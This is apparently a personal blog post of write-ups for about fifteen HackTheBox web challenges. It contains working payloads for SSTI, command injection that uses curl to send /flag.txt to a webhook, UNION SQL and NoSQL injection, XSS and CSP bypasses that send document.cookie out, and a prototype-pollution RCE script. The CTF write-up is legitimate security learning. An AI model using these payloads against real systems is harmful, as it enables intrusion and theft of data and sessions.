---
layout: post
title: Hackthebox
date: 09-01-2025
categories: [Documentation]
tag: [web, htb, hackthebox, ctf]
image:
  path: /assets/img/titles/mega-menu-logo-htb.svg
  alt: hackthebox image
description: Some cool and fun web challenges from hackthebox.
---

# Web

## Flag Command

After some time exploring, I couldn't find a way to exploit using `command injection`, so I started digging through the source code and moved to the `Network` tab of the `Dev tool`. There, I found a field called `secret` containing the `text` : `Blip-blop, in a pickle with a hiccup! Shmiggity-shmack.`. I passed it into the `command`, and it returned the `flag`.

## Spookifier

In this challenge, we see that font4 will not be mapped to other things, so we will perform a general attack using `SSTI with Mako`. [link](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)

`payload`
```
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99,97,116,32,47,102,108,97,103,46,116,120,116])).read()}

99 97 116 32 47 102 108 97 103 46 116 120 116 = cat /flag.txt
```

## WayWitch

`util.js`
```javascript
const jwt = require("jsonwebtoken");

function getUsernameFromToken(token) {
  const secret = "halloween-secret";

  try {
    const decoded = jwt.verify(token, secret);
    return decoded.username;
  } catch (err) {
    throw new Error("Invalid token: " + err.message);
  }
}

module.exports = {
  getUsernameFromToken,
};
```

`database.js`
```javascript
const sqlite = require("sqlite-async");
const fs = require("fs");

class Database {
  constructor(db_file) {
    this.db_file = db_file;
    this.db = undefined;
  }

  async connect() {
    this.db = await sqlite.open(this.db_file);
  }

  async migrate() {
    let flag;
    fs.readFile("/flag.txt", "utf8", function (err, data) {
      flag = data;
    });

    await this.db.exec(`
          DROP TABLE IF EXISTS tickets;

          CREATE TABLE tickets(
              id INTEGER PRIMARY KEY AUTOINCREMENT,
              name VARCHAR(255) NOT NULL,
              username VARCHAR(255) NOT NULL,
              content TEXT NOT NULL
          );
      `);

    await this.db.exec(`
          INSERT INTO tickets (name, username, content) VALUES
          ('John Doe', 'guest_1234', 'I need help with my account.'),
          ('Jane Smith', 'guest_5678', 'There is an issue with my subscription.'),
          ('Admin', 'admin', 'Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter ${flag}'),
          ('Paul Blake', 'guest_9012', 'Can someone assist with resetting my password?'),
          ('Alice Cooper', 'guest_3456', 'The app crashes every time I try to upload a picture.');
      `);
  }

  async add_ticket(name, username, content) {
    return new Promise(async (resolve, reject) => {
      try {
        let stmt = await this.db.prepare(
          "INSERT INTO tickets (name, username, content) VALUES (?, ?, ?)",
        );
        resolve(await stmt.run(name, username, content));
      } catch (e) {
        reject(e);
      }
    });
  }

  async get_tickets() {
    return new Promise(async (resolve, reject) => {
      try {
        let stmt = await this.db.prepare("SELECT * FROM tickets");
        resolve(await stmt.all());
      } catch (e) {
        reject(e);
      }
    });
  }
}

module.exports = Database;
```

`routes.js`
```javascript
const express = require("express");
const router = express.Router({ caseSensitive: true });
const { getUsernameFromToken } = require("../util");

let db;

const response = (data) => ({ message: data });

router.get("/", (req, res) => {
  return res.render("index.html");
});

router.get("/tickets", async (req, res) => {
  const sessionToken = req.cookies.session_token;

  if (!sessionToken) {
    return res.status(401).json(response("No session token provided"));
  }

  try {
    const username = getUsernameFromToken(sessionToken);

    if (username === "admin") {
      try {
        const tickets = await db.get_tickets();
        return res.status(200).json({ tickets });
      } catch (err) {
        return res
          .status(500)
          .json(response("Error fetching tickets: " + err.message));
      }
    } else {
      return res
        .status(403)
        .json(response("Access denied. Admin privileges required."));
    }
  } catch (err) {
    return res.status(400).json(response(err.message));
  }
});

router.post("/submit-ticket", async (req, res) => {
  const sessionToken = req.cookies.session_token;

  if (!sessionToken) {
    return res.status(401).json(response("No session token provided"));
  }

  let username;
  try {
    username = getUsernameFromToken(sessionToken);
  } catch (err) {
    return res.status(400).json(response(err.message));
  }

  const { name, description } = req.body;

  if (!name || !description) {
    return res.status(400).json(response("Name and description are required"));
  }

  try {
    await db.add_ticket(name, username, description);
    return res.status(200).json(response("Ticket submitted successfully"));
  } catch (err) {
    return res
      .status(500)
      .json(response("Error submitting ticket: " + err.message));
  }
});

module.exports = (database) => {
  db = database;
  return router;
};
```

We see that the `flag` will be in the `Admin's information` and belongs to the `tickets` table, and it will be displayed through the `get_tickets` function. In `/routes/index.js`, the table's information is displayed using the command `const tickets = await db.get_tickets();` via the `/tickets` endpoint with the `GET` method.

### `Exploit`

According to the source code, simply changing the name is not enough, we can see that the username must also be `admin` to display the information.

```javascript
router.get("/tickets", async (req, res) => {
  const sessionToken = req.cookies.session_token;

  if (!sessionToken) {
    return res.status(401).json(response("No session token provided"));
  }

  try {
    const username = getUsernameFromToken(sessionToken);

    if (username === "admin") {
      try {
        const tickets = await db.get_tickets();
        return res.status(200).json({ tickets });
      } catch (err) {
        return res
          .status(500)
          .json(response("Error fetching tickets: " + err.message));
      }
    } else {
      return res
        .status(403)
        .json(response("Access denied. Admin privileges required."));
    }
  } catch (err) {
    return res.status(400).json(response(err.message));
  }
});
```
`and`

```javascript
function getUsernameFromToken(token) {
  const secret = "halloween-secret";

  try {
    const decoded = jwt.verify(token, secret);
    return decoded.username;
  } catch (err) {
    throw new Error("Invalid token: " + err.message);
  }
}
```

We see that the session token requires the `secret key` to encode, so let's temporarily submit something and modify it in `Burp Suite`

![pic1](https://hackmd.io/_uploads/rJe3S858kg.png)

![pic2](https://hackmd.io/_uploads/B18RS89UJg.png)

![pic3](https://hackmd.io/_uploads/B13IUUqU1g.png)

Here, we need to provide the `key`, change the `name` to `Admin`    , and the `username` to `admin`, then switch the method to `GET` with the endpoint `/tickets`

![pic4](https://hackmd.io/_uploads/BkVzvL98ke.png)

![pic5](https://hackmd.io/_uploads/B1sVDI5L1x.png)

![pic6](https://hackmd.io/_uploads/rkQkO8c81e.png)

## Void Whispers

After reading the source code for a while, I noticed that the program adjusts the variables and applies regex to their values. However, the main vulnerability here lies in `challenge/controllers/IndexController.php`, specifically in the execution of `$sendMailPath` through:

```javascript
whichOutput = shell_exec("which $sendMailPath");
```
And here, the `$sendMailPath` variable is only checked to ensure the input does not contain whitespace:

```javascript
if (preg_match('/\s/', $sendMailPath)) {
      return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
    }
```

And since the result of the command is not displayed, I used a [webhook](https://webhook.site/) to extract the content of `flag.txt` and replaced the whitespace with`${IFS}`

`payload`
```shell
/usr/sbin/sendmail;curl${IFS}https://webhook.site/ac0401dc-4c52-427a-9ef0-0b5a8f8682dc${IFS}-d${IFS}@/flag.txt${IFS}
```

## Unholy Union

In this challenge, from the source code, we can clearly see that it involves an `SQL injection vulnerability`, characterized by the use of a `UNION injection`

```javascript
const express = require("express");
const path = require("path");
const mysql = require("mysql2/promise");
const app = express();

// Create a MySQL connection pool
const pool = mysql.createPool({
  host: "127.0.0.1",
  user: "user",
  password: "user_password",
  database: "halloween_invetory",
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
});

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept",
  );
  next();
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/", async (req, res) => {
  const query = req.query.query ? req.query.query : "";
  let results = { status: null, message: null };

  res.sendFile(path.join(__dirname, "views", "index.html"));
});

app.get("/search", async (req, res) => {
  const query = req.query.query ? req.query.query : "";
  let results = { status: null, message: null };

  try {
    let sqlQuery;

    if (query === "") {
      sqlQuery = "SELECT * FROM inventory";
    } else {
      sqlQuery = `SELECT * FROM inventory WHERE name LIKE '%${query}%'`;
    }

    const [rows] = await pool.query(sqlQuery);
    results.status = "success";
    results.message = rows;
  } catch (err) {
    console.error("Error executing query:", err.stack);
    results.status = "failed";
    results.message = err.message;
  }

  return res.json(results);
});

app.use((req, res) => {
  res.sendFile(path.join(__dirname, "views", "404.html"));
});

app.listen(3000, () => {
  console.log(`Proxy server is running on http://localhost:3000`);
});
```

Therefore, I tried entering `a` to see the result.

![pic1](https://hackmd.io/_uploads/BJyidu5Iyg.png)

From here, we can see that the table has `5 columns`, the `database` name is `halloween_inventory`, and it contains a `table` named `inventory`. Next, I tried searching for all the `tables` in the database to check if there were any others.

`payload`
```
Gun' union select null, null, null, null, (select group_concat(table_name) from information_schema.tables where table_schema='halloween_invetory')-- -

// This payload is designed to display information containing 'Gun' and show the names of the tables in the halloween_inventory database. One important note is that the information must have exactly 5 columns.
```

![pic2](https://hackmd.io/_uploads/BJueiO5Ike.png)

From the result, we can see that there is also a flag table, and the `flag`` is likely in this table. Now, let's check how many columns are in this table.

`payload` 
```
Gun' union select null, null, null, null, (select group_concat(column_name) from information_schema.columns where table_name='flag')-- -
```

![pic3](https://hackmd.io/_uploads/H1mCi_qUkl.png)

There is one `flag` column, and now we just need to view its value.

`payload`
```
Gun' union select null, null, null, null, (select * from flag)-- -
```

![pic4](https://hackmd.io/_uploads/rySIhd9I1e.png)

## Phantom Script

This challenge provides us with a lot of information about `XSS vulnerabilities` and also includes the detail that activating a warning will trigger the `flag`. Therefore, I tried a basic `payload` and waited for a while to receive the `flag`

`payload`
```
<img src=x onerror="alert('Boo!')">
```

![pic](https://hackmd.io/_uploads/ByjpyF581x.png)

## KORP Terminal

In this challenge, after I exploited it and entered "'", an error occurred, so I tried to exploit it using `SQL injection` with `SQLMap` tool

![pic](https://hackmd.io/_uploads/HyzvB55Uyg.png)

After the decoding process, I realized it was `bcrypt` and used `Hashcat` with `rockyou.txt` to `crack` it.

![pic2](https://hackmd.io/_uploads/HkATH5q8yg.png)

After that, simply log in as `admin` using the cracked password to get the `flag`

## TimeKORP

In this challenge, we can exploit a `command injection vulnerability` in the format variable to read the content of `/flag`

`payload`
```shell
';cat ../flag'
```

## SpookTastic

In this challenge, we can observe the characteristics of an `XSS vulnerability` for injecting into the email field. Accordingly, we only need a basic payload using an `<img>` tag to trigger an exception and obtain the `flag`

`payload`
```shell
<img src/onerror=alert(1)>
```

## CandyVault

In this challenge, we can trick the system to bypass `authentication`. The vulnerability is related to `NoSQL injection` (MongoDB payload)

`payload`
```shell
{"email": {"$ne": null}, "password": {"$ne": null}}
```

[docs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md)

## Trapped Source

This challenge involves using the console in the `developer tools`. In `script.js`, we can see that `currentPin` is an `array`, and it is compared to `correctPin: "3030"`. From here, we can manipulate it by directly assigning `currentPin` to the correct `password` in array format: `currentPin = ["3", "0", "3", "0"]`. After that, we call the `checkPin()` function to verify, and we obtain the `flag`

## Cursed Secret Party

In this challenge, we need to bypass `CSP`(Content-Security-Policy ) to execute an `XSS injection`. I used a [webhook](https://webhook.site/) to receive the `token` sent back, and this URL was referenced using the `JSDeliver CDN`

Create a public `Github repository` and a `script` (a.js)

```shell
location="https://webhook.site/ac0401dc-4c52-427a-9ef0-0b5a8f8682dc/?c="+document.cookie
```

And conver at [here](https://www.jsdelivr.com/github)

![pic1](https://hackmd.io/_uploads/ry1S5Ro8kg.png)

`payload`

```javascript
<script src="https://cdn.jsdelivr.net/gh/zh13uz/a@main/a.js"></script>
```

![pic2](https://hackmd.io/_uploads/HyjhqRsIkx.png)

After that, just decode the [JWT](https://jwt.io/) to get the `flag`

## Juggling facts

This challenge involves a `PHP Type Juggling` vulnerability. It appears that we need to access the `secrets` `type` to retrieve the content. I found related websites, and instead of passing a value, I manipulated it to always evaluate as true to bypass the validation.

![pic1](https://hackmd.io/_uploads/ryINTCiL1x.png)

## Gunship

While reading the source code in `/challenge/routes/index.js`, a fairly common vulnerability was found: `AST injection`

`Documents` at [here](https://hackmd.io/@CP04042K/rkPZgkAes)

`payload`
```javascript
{
    "artist.name":"Haigh",
    "__proto__.block": {
        "type": "Text",
        "line":
        "console.log(process.mainModule.require('child_process').execSync('ls -al > /app/static/cc').toString())"
    }
}
```

`script`
```python
import requests 

url = "http://94.237.56.187:34511/"

cmd = "ls -al > /app/static/cc"
res = requests.post(url+'api/submit', json={
    "artist.name":"Haigh",
    "__proto__.block": {
        "type": "Text",
        "line":
        "console.log(process.mainModule.require('child_process').execSync('ls -al > /app/static/cc').toString())"
    }
})
print(requests.get(url+'static/cc').text) 
```

## Cursed Stale Policy

After researching `CSP nonces`, I read and followed the instructions from [here](https://content-security-policy.com/nonce/)

Accordingly, we need to add the `nonce` attribute for the `bot` to `fetch` the data.

`payload`
```javascript
<script nonce="24bcf9506ed5c5cbee23b565f95f1099">
   fetch('/callback', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookies: document.cookie })
   });
</script>
```



